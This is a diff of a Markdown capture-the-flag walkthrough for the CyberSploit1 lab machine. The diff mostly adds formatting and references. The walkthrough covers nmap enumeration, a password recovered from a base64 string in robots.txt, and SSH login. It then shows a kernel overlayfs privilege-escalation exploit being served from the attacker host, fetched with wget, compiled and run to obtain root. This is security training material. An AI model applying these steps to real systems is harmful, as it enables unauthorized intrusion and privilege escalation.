@@ -5,10 +5,16 @@
 - [References](#references)
 
 ## Machine information
-```
+
+```text
 Difficulty: Easy
+Community Rating: Easy
 OS: Linux
 Points: 5
+Description:
+Utilize enumeration and web enumeration techniques to identify vulnerabilities. Engage in privilege 
+escalation strategies and leverage kernel exploitation methods to enhance your access. This lab is 
+designed to capitalize on your skills in vulnerability exploitation.
 Released: 6 Oct 2020
 ```
 
@@ -17,6 +23,7 @@ Released: 6 Oct 2020
 ### Scan for services with nmap
 
 We start by scanning the machine with `nmap`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/CyberSploit1]
 └─$ nmap -v -sV -sC 192.168.198.92
@@ -76,18 +83,22 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
 ```
+
 We have two services running:
+
 - OpenSSH 5.9p1 on port 22
 - Apache httpd v2.2.22 on port 80
 
 ### Check the web site
 
 Browsing manually to port 80 and checking the source of the homepage gives us a username in a comment
-```
+
+```text
 <!-------------username:itsskv--------------------->
 ```
 
 We can also run all HTTP-related enumeration scripts in nmap
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/CyberSploit1]
 └─$ nmap -v -p80 --script "http-enum*" 192.168.198.92
@@ -124,6 +135,7 @@ Nmap done: 1 IP address (1 host up) scanned in 3.33 seconds
 ```
 
 Let's check the contents of the [robots.txt](https://en.wikipedia.org/wiki/Robots.txt) file
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/CyberSploit1]
 └─$ curl http://192.168.198.92/robots.txt
@@ -133,12 +145,14 @@ Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=
 └─$ curl -s http://192.168.198.92/robots.txt | base64 -d
 cybersploit{youtube.com/c/cybersploit}
 ```
-The base64-encoded looks very much like a flag, but it wasn't (any more).  
-Could it be the password for the `itsskv` user. Let's try it!
+
+The base64-encoded looks very much like a flag, but it wasn't (at least not any more).  
+Could it be the password for the `itsskv` user? Let's try it!
 
 ### Login as itsskv via SSH
 
 We try our flag-like password and it works
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/CyberSploit1]
 └─$ ssh itsskv@192.168.198.92                                                
@@ -164,6 +178,7 @@ itsskv@cybersploit-CTF:~$
 ### Get the user flag
 
 Now we can start looking for the user flag
+
 ```bash
 itsskv@cybersploit-CTF:~$ ls -la
 total 156
@@ -207,6 +222,7 @@ itsskv@cybersploit-CTF:~$ cat local.txt
 e<REDACTED>0
 itsskv@cybersploit-CTF:~$ 
 ```
+
 Nice, so far so good.
 
 ### Enumeration for privesc
@@ -214,12 +230,14 @@ Nice, so far so good.
 Next, we enumerate the system for privilege escalation opportunities.
 
 After some enumeration the kernel version was identified as an old one
+
 ```bash
 itsskv@cybersploit-CTF:~$ uname -a
 Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 athlon i386 GNU/Linux
 ```
 
 Perhaps there is an local privesc exploit available?
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/CyberSploit1]
 └─$ searchsploit linux 3.13.0 local privilege
@@ -276,12 +294,14 @@ Copied to: /mnt/hgfs/Wargames/OffSec_PG/PG_Play/CyberSploit1/37292.c
 File Type: ASCII text
 Copied to: /mnt/hgfs/Wargames/OffSec_PG/PG_Play/CyberSploit1/37293.txt
 ```
+
 There are two possible overlayfs-related ones for the specific kernel versions.  
 Let's examine them more closely.
 
 ### Examine the possible exploits
 
 First the C source code one
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/CyberSploit1]
 └─$ head -50 37292.c
@@ -336,11 +356,13 @@ greets to beist & kaliman
 #include <signal.h>
 #include <fcntl.h>
 ```
+
 This one looks interesting...
 
 Now for the text instruction one
+
 ```bash
-──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/CyberSploit1]
+┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/CyberSploit1]
 └─$ cat 37293.txt   
 The overlayfs filesystem does not correctly check file permissions when
 creating new files in the upper filesystem directory. This can be exploited
@@ -440,12 +462,14 @@ References
 
 ## EDB Note: Exploit Mirror - https://www.exploit-db.com/exploits/37292  
 ```
+
 The first one seems more direct.  
 Let's transfer it and compile it.
 
 ### Transfer the exploit and compile it
 
 We share the exploit via HTTP
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/Wargames/OffSec_PG/PG_Play/CyberSploit1]
 └─$ python -m http.server 8000
@@ -454,6 +478,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 And download it to the cybersploit-machine with `wget`
+
 ```bash
 itsskv@cybersploit-CTF:~$ cd /tmp
 itsskv@cybersploit-CTF:/tmp$ which wget
@@ -471,7 +496,8 @@ Saving to: `37292.c'
 ```
 
 Then we compile and run the exploit
-```
+
+```bash
 itsskv@cybersploit-CTF:/tmp$ gcc 37292.c -o ofs
 itsskv@cybersploit-CTF:/tmp$ chmod +x ofs 
 itsskv@cybersploit-CTF:/tmp$ ./ofs 
@@ -485,11 +511,13 @@ creating shared library
 uid=0(root) gid=0(root) groups=0(root),1001(itsskv)
 #   
 ```
+
 Excellent, we are root!
 
 ### Get the root flag
 
 Finally we get the root flag
+
 ```bash
 # cd /root
 # ls    
@@ -504,9 +532,14 @@ For additional information, please see the references below.
 ## References
 
 - [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
+- [base64 - Linux manual page](https://man7.org/linux/man-pages/man1/base64.1.html)
+- [Base64 - Wikipedia](https://en.wikipedia.org/wiki/Base64)
+- [nmap - Homepage](https://nmap.org/)
 - [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
+- [nmap - Manual page](https://nmap.org/book/man.html)
 - [OpenSSH  - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
 - [robots.txt - Wikipedia](https://en.wikipedia.org/wiki/Robots.txt)
 - [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
 - [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
+- [uname - Linux manual page](https://man7.org/linux/man-pages/man1/uname.1.html)
 - [wget - Linux manual page](https://man7.org/linux/man-pages/man1/wget.1.html)
